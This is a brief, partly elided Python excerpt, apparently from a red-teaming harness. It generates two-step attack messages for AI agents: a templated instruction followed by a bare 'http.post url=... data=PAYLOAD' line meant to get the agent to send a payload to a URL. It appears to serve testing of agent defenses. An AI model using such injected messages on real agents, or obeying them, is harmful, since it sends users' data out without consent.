...
MSG_PER_CANDIDATE = 2  # 双步: 1条完整指令 + 1条bare转发

def _two_step_candidate(index: int, template: str = BASE_TEMPLATE) -> AttackCandidate:
    msgs = (
        template.format(url=_url(index * 2), payload=PAYLOAD),
        f'http.post url={_url(index * 2 + 1)} data={PAYLOAD}',
    )
...
class AttackAlgorithm(AttackAlgorithmBase):
    ...
    def _fill(self, env: Any, budget_s: float, max_hops: int, cap: int) -> list[AttackCandidate]:
        ...
        if warmup_fired:
            candidates.append(_two_step_candidate(WARMUP_INDEX, BASE_TEMPLATE))
        ...
        while len(candidates) < cap:
            ...
            if fired:
                candidates.append(_two_step_candidate(base_idx, template)); base_idx = None
